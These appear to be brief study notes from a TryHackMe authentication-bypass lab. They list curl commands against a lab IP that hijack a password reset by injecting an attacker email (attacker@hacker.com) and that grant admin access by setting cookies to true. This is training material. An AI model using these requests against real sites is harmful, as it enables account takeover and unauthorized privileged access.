# 📌 Authentication Bypass

## Logic Flaw


user@tryhackme$ curl 'http://10.49.161.141/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

user@tryhackme$ curl 'http://10.49.161.141/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

user@tryhackme:~$ curl 'http://10.49.161.141/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

## Cookie Tampering

user@tryhackme$ curl http://10.49.161.141/cookie-test

user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.49.161.141/cookie-test

user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.49.161.141/cookie-test

https://crackstation.net/

https://www.base64decode.org/